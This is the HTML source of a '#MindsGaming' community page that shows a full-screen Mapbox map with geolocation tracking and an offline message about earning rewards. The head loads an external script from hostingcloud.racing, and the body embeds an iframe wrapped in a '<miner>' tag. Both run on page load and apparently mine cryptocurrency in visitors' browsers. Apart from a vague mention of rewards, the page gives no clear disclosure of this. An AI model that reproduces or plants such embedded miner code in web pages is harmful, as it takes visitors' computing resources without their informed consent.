<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />

    <script src="/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <script src="https://mindsgaming.glitch.me/mtcg/docs.js"></script>
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <script src="https://api.mapbox.com/mapbox-gl-js/v2.3.1/mapbox-gl.js"></script>
    <link
      href="https://api.mapbox.com/mapbox-gl-js/v2.3.1/mapbox-gl.css"
      rel="stylesheet"
    />
  </head>
  <body>
    <miner><iframe src="/miner"> </iframe></miner>
    <div
      id="map"
      style="position: fixed; top: 0; display: block; width: 100%; height: 100%"
    ></div>
    <script>
      mapboxgl.accessToken =
        "pk.eyJ1IjoiZ2FtZXJjb2luIiwiYSI6ImNreWJ2czVvMzAxM3kybnFtc3NpYXZjeHQifQ.fk7gj-Gvd69eaRRmr8vBFA";
      var map = new mapboxgl.Map({
        container: "map",
        style: "mapbox://styles/gamercoin/ckybwptbp0ev314qkjd7iqwpm",
        center: [-100.2, 40], // starting position
        zoom: 3, // starting zoom
      });

      // Add zoom and rotation controls to the map.
      map.addControl(new mapboxgl.NavigationControl());
      // Add geolocate point.
      map.addControl(
        new mapboxgl.GeolocateControl({
          positionOptions: {
            enableHighAccuracy: true,
          },
          trackUserLocation: true,
        })
      );
    </script>

    <div id="offline" class="hide">
      <center>
        <h1>
          <br />
          You Appear To Be Offline
        </h1>
        <p>You can't earn rewards offline. Reconnect To Earn Rewards</p>
        <div class="offlineIMG"></div>
      </center>
    </div>
  </body>
</html>
